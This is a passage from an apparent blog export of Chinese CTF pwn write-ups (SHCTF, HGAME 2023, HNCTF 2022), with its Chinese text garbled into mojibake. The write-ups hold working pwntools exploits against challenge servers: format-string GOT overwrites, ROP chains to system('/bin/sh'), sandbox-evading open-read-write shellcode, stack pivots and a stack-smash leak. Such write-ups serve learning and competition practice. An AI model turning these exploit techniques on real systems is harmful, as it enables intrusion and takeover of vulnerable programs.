function_">debug</span>():</span><br><span class="line">   gdb.attach(p)</span><br><span class="line">   pause()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">   <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">se = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">rc = <span class="keyword">lambda</span> numb=<span class="number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> delims: p.recvuntil(delims)</span><br><span class="line">su = <span class="keyword">lambda</span> delim, data: success(delim + <span class="built_in">hex</span>(data))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line">   libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">   srand = libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">   x = libc.rand()</span><br><span class="line">   y = (x+<span class="number">1919810</span>)^<span class="number">114514</span></span><br><span class="line">   sl(<span class="built_in">str</span>(y))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line">   v1 = <span class="number">2147483647</span>+<span class="number">200</span></span><br><span class="line">   v2 = v1 - <span class="number">100</span></span><br><span class="line">   sla(<span class="string">&quot;v1:\n&quot;</span>, <span class="built_in">str</span>(v1))</span><br><span class="line">   sla(<span class="string">&quot;v2:\n&quot;</span>, <span class="built_in">str</span>(v2))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test3</span>():</span><br><span class="line">   libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">   offset = <span class="number">6</span></span><br><span class="line">   payload1 = <span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line">   sla(<span class="string">b&#x27;gift\n&#x27;</span>, payload1)</span><br><span class="line">   write_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(),<span class="number">16</span>)-<span class="number">23</span></span><br><span class="line">   libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">   su(<span class="string">&quot;libc_base:&quot;</span>,libc_base)</span><br><span class="line">   system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">   su(<span class="string">&quot;system:&quot;</span>,system)</span><br><span class="line">   system1 = (system &amp; <span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">   system2 = (system&amp;<span class="number">0xffff</span>)</span><br><span class="line">   su(<span class="string">&quot;system1:&quot;</span>,system1)</span><br><span class="line">   su(<span class="string">&quot;system2:&quot;</span>,system2)</span><br><span class="line">   payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(system1).encode()+<span class="string">b&#x27;c%10$hhn&#x27;</span></span><br><span class="line">   payload2 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(system2-system1).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line">   payload2 += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">   payload2 += p64(elf.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">2</span>) + p64(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">   sl(payload2)</span><br><span class="line">   sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">test1()</span><br><span class="line">test2()</span><br><span class="line">test3()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="start-your-pwn">Start Your PWN!</span></h2><ol>
<li><code>read</code> å‡½æ•°å¯æº¢å‡ºï¼›</li>
<li>IDA å¯è§ <code>__libc_csu_init</code> å¯ç”¨ï¼›</li>
<li><code>write</code> æ‰§è¡Œåæ³„éœ²çœŸå®åœ°å€ä»¥è·å– libc ç‰ˆæœ¬ï¼›</li>
<li>IDA è·å– <code>write</code> å’Œ <code>main</code> åœ°å€ï¼›</li>
<li>ä½¿ç”¨ <code>ropgadget</code> è·å–å¯ç”¨ç‰‡æ®µã€‚</li>
</ol>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30082</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = <span class="number">0x601018</span></span><br><span class="line">main_addr = <span class="number">0x400699</span></span><br><span class="line">pop_addr = <span class="number">0x40076A</span></span><br><span class="line">mov_addr = <span class="number">0x400750</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400773</span></span><br><span class="line">ret = <span class="number">0x400506</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(mov_addr) + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“</span></h1><p>åšå¾—ä¸å¤ªçŸ¥æ‰€æªï¼Œäº‘é‡Œé›¾é‡Œï¼Œè¿˜éœ€ç»§ç»­åŠ æ²¹ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SHCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[HGAME 2023 week1] PWN å¤ç°</title>
    <url>/%5BHGAME%202023%20week1%5D%20PWN%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[HGAME 2023 week1] PWN å¤ç°</p>
<span id="more"></span>

<h2><span id="test_nc">test_nc</span></h2><p>ç­¾åˆ°é¢˜ï¼š</p>
<blockquote>
<p>nc ä¸€ä¸‹</p>
<p>cat flag</p>
</blockquote>
<hr>
<h2><span id="easy_overflow">easy_overflow</span></h2><p>ç»å…¸çš„æ ˆæº¢å‡ºï¼Œä½†éœ€è¦æ³¨æ„ <code>close(1)</code> å…³é—­äº†æ ‡å‡†è¾“å‡ºæµï¼Œå› æ­¤éœ€å…ˆæ‰“å¼€æ‰èƒ½æ‹¿åˆ° shellã€‚EXP å¦‚ä¸‹</p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28203</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x40117E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span> +<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="simple_shellcode">simple_shellcode</span></h2><p>é¦–å…ˆidaä¸€ä¸‹ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„äº†è§£åˆ°è·Ÿæ²™ç›’æœ‰å…³ï¼Œå†æŸ¥ä¸€ä¸‹æ²™ç›’æœºåˆ¶ï¼Œæ˜¾ç„¶ä¸èƒ½ç›´æ¥æ„é€ orwï¼Œå†åŠ ä¸Šreadæ‰€å­˜å‚¨çš„å­—èŠ‚æ•°å°‘ï¼Œä¸èƒ½ç›´æ¥æ„é€ ï¼Œæ‰€ä»¥å¯ä»¥åœ¨mmapä¸Šé¢æ¥æ„é€ orw</p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
<p>mmapå‡½æ•°è§£æï¼š</p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28291</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;shellcode:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">mmap_addr = <span class="number">0xcafe0000</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p.send(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>)))</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="orw">orw</span></h2><p>å…ˆidaä¸€ä¸‹ï¼Œå¯ä»¥çœ‹å‡ºæ¥éœ€è¦è¿›è¡Œæ ˆè¿ç§»ï¼Œå¹¶ä¸”è¿˜å­˜åœ¨æ²™ç›’ï¼Œè¿˜æœ‰ä¸€æ®µ0x30çš„ç©ºé—´ï¼ˆæº¢å‡ºçš„ç©ºé—´è¾ƒå¤§ï¼‰ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆexpå’Œ[NSSCTF Round#14 Basic] rbp ä¸ä¸€æ ·çš„åŸå› ï¼Œå¯æº¢å‡ºçš„ç©ºé—´ä¸åŒï¼Œå¯¼è‡´æ‰€åˆ©ç”¨çš„æ¡ä»¶ä¸åŒ</p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
<p>å…ˆæ³„éœ²libcï¼Œå†æŠŠorwå†™åœ¨è‡ªå·±ç¡®å®šçš„bssæ®µï¼Œå†ç”¨ leave ret è½¬åˆ°bssæ®µï¼Œæ‰§è¡Œorw</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28392</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret     = <span class="number">0x401393</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x401391</span></span><br><span class="line">bss_addr        = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">puts_plt        = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got        = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln_addr       = <span class="number">0x4012c0</span></span><br><span class="line">leave_ret       = <span class="number">0x4012be</span></span><br><span class="line">read            = <span class="number">0x4012CF</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;task.\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">open_addr  = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr  = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x2601f</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x142c92</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>) + p64(bss_addr+<span class="number">0x100</span>) + p64(read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(write_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="choose_the_seat">choose_the_seat</span></h2><p>è¯¥é¢˜å­˜åœ¨æ•°ç»„è¶Šç•Œå¯¼è‡´çš„ GOT overwrite åˆ©ç”¨æµç¨‹ï¼Œåˆ©ç”¨è´Ÿæ•°è¶Šç•Œå’Œ oneâ€‘gadget è·å– shellï¼Œè¿™é¢˜æœ‰ç‚¹éš¾ï¼Œä¸å¤ªä¼šå†™ï¼Œæ­¤é¢˜å­˜åœ¨æ•°ç»„è¶Šç•Œï¼ˆä¸‹æ¬¡æ‡‚äº†å†æ¥ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./choose&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28620</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x4011d6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(main_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-8&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget  = libc_base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(one_gadget))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>[HNCTF 2022 WEEK3] smash å¤ç°</title>
    <url>/%5BHNCTF%202022%20WEEK3%5D%20smash%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[HNCTF 2022 WEEK3] smash å¤ç°</p>
<span id="more"></span>

<h1><span id="smash">smash</span></h1><p>æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼Œæ­£å¦‚é¢˜ç›®çš„åå­— smashï¼ˆæ‰€ä»¥ä¼šæ¶‰åŠåˆ°èŠ±å¼æ ˆæº¢å‡º stack smashï¼‰ï¼Œæ‰“å¼€äº† NX å’Œ canary</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>IDA ä¸€ä¸‹ï¼Œå‘ç° gets å‡½æ•°é€ æˆäº†æº¢å‡ºï¼Œå¹¶ä¸” flag å­˜åœ¨ buf é‡Œé¢</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/2.png"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦äº†è§£ä¸€ä¸‹ stack smash<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash">ï¼ˆèŠ±å¼æ ˆæº¢å‡ºæŠ€å·§ - CTF Wiki (ctf-wiki.org)ï¼‰</a></p>
<blockquote>
<h2><span id="stack-smash">Stack smash</span></h2><p>åœ¨ç¨‹åºåŠ äº† canary ä¿æŠ¤ä¹‹åï¼Œå¦‚æœæˆ‘ä»¬è¯»å–çš„ buffer è¦†ç›–äº†å¯¹åº”çš„å€¼æ—¶ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™ï¼Œè€Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬å¹¶ä¸ä¼šå…³å¿ƒæŠ¥é”™ä¿¡æ¯ã€‚è€Œ stack smash æŠ€å·§åˆ™å°±æ˜¯åˆ©ç”¨æ‰“å°è¿™ä¸€ä¿¡æ¯çš„ç¨‹åºæ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ã€‚è¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºå¯åŠ¨ canary ä¿æŠ¤ä¹‹åï¼Œå¦‚æœå‘ç° canary è¢«ä¿®æ”¹çš„è¯ï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œ <code>__stack_chk_fail</code> å‡½æ•°æ¥æ‰“å° <code>argv[0]</code> æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘äº†ç¨‹åºåã€‚</p>
</blockquote>
<p>å½“æˆ‘ä»¬äº†è§£äº† Stack smash åï¼Œæˆ‘ä»¬å°±å¯ä»¥æº¢å‡ºåˆ° arg[0]ï¼Œç„¶åå°†è¯¥æŒ‡é’ˆæ”¹æˆ buf å°±èƒ½è·å¾— flagï¼Œä¸‹é¢å°±å¼€å§‹æ±‚åç§»ã€‚</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/3.png"></p>
<p>ä¸¤ä¸ªåœ°å€ç›¸å‡å°±å¯å¾—åç§» 0x208ï¼ˆä½†æ˜¯æ­£ç¡®çš„åç§»æ˜¯ 0x1f8ï¼Œæ¯”æ­£ç¡®çš„åç§»å¤šäº† 0x10ï¼Œé—®äº†ä¸‹å­¦é•¿å¯èƒ½æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œæ–¹æ³•ä¼šäº†å°±è¡Œï¼Œå°é—®é¢˜ä¸ä¼¤å¤§é›…ï¼‰</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/4.png"></p>
<p>ä¹Ÿå¯ä»¥è¿™æ ·ç®—</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/5.png"></p>
<h2><span id="expå¦‚ä¸‹">expå¦‚ä¸‹ï¼š</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(â€™./pwnâ€™)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">buf_addr = <span class="number">0x404060</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f8</span> + p64(buf_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Good Luck.\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>è¿™é¢˜æ„Ÿè§‰ç¨å¾®äº†è§£äº† Stack smash è¿™ç§èŠ±å¼æ ˆæº¢å‡ºçš„æ–¹æ³•ï¼Œè¿™é¢˜ç†è§£èµ·æ¥æ¯”è¾ƒå‹å¥½ï¼Œå…¶ä»–çš„é¢˜åƒç½‘é¼æ¯é‚£é“ç›¸åŒçš„æ–¹æ³•çš„ä¸å¤ªå¥½ç†è§£ï¼Œæ€»ä¹‹å°±æ˜¯è‡ªå·±çŸ¥è¯†å‚¨å¤‡ä¸å¤Ÿï¼ŒåŠ æ²¹ï¼Œå·èµ·æ¥ï¼Œå†²å†²å†²ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HNCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[HNCTF 2022 WEEK4] ezcanary å¤ç°</title>
    <url>/%5BHNCTF%202022%20WEEK4%5D%20ezcanary%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[HNCTF 2022 WEEK4] ezcanary å¤ç°</p>
<span id="more"></span>

<h1><span id="ezcanary">ezcanary</span></h1><p>å…ˆæŸ¥ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œæ‰“å¼€ canary å’Œ NXï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦æ³¨æ„å¯ä»¥æ³„éœ² canary</p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>IDA ä¸€ä¸‹ï¼Œçœ‹çœ‹ä¼ªä»£ç ï¼Œæ€è·¯å¾ˆæ¸…æ™°äº†ï¼Œ<code>printf</code> é€ æˆäº†æ ¼å¼å­—ç¬¦ä¸²æ¼æ´å’Œç¬¬äºŒä¸ª <code>read</code> é€ æˆçš„æº¢å‡º</p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/2.png"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•æº¢å‡º canaryï¼Œå¹¶ä¸”æ³„éœ² libcï¼Œå…ˆè¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œçœ‹çœ‹åç§»å§ï¼ˆå¾ˆå®¹æ˜“å‘ç°åç§»æ˜¯å…­ï¼‰ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ gdb è°ƒè¯•ï¼Œçœ‹çœ‹ canary ä½ç½®äº†ï¼ŒæŠŠæ–­ç‚¹æ‰“åœ¨ <code>printf</code></p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/3.png"></p>
<p>æ˜¾ç„¶ canary å°±æ˜¯ç¬¬ 51 ä¸ªå‚æ•°ï¼ˆè¿™ä¸ªä½ ä¸ä¼šçœ‹ä¸å‡ºæ¥å§ï¼Œè¯„è®ºåŒºè§ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ° canary çš„åœ°å€äº†ï¼Œæ¥ä¸‹æ¥å°±å‰©ä¸‹æ³„éœ² libc äº†ï¼Œæ³¨æ„ä¸‹é¢ä¸¤ä¸ªå‚æ•°å°±æ˜¯å¯ä»¥æ³„éœ²çš„ libc åœ°å€ <code>0x7ffff7db0d90</code>ï¼ˆæ³¨æ„ä¸åŒä»£ç çš„é¢œè‰²ï¼‰ï¼Œå†ä» <code>vmmap</code> æ‰¾åˆ° libcï¼Œç„¶åå°±å¯ä»¥ç®—åˆ°åç§»äº†ï¼Œæœ€åå°±å¯ä»¥å¾—åˆ° libc çš„åŸºå€äº†ï¼ˆå¤ªè£¤è¾£ï¼‰</p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/4.png"></p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/5.png"></p>
<p>åé¢å°±æ˜¯æ­£å¸¸çš„æº¢å‡ºäº†</p>
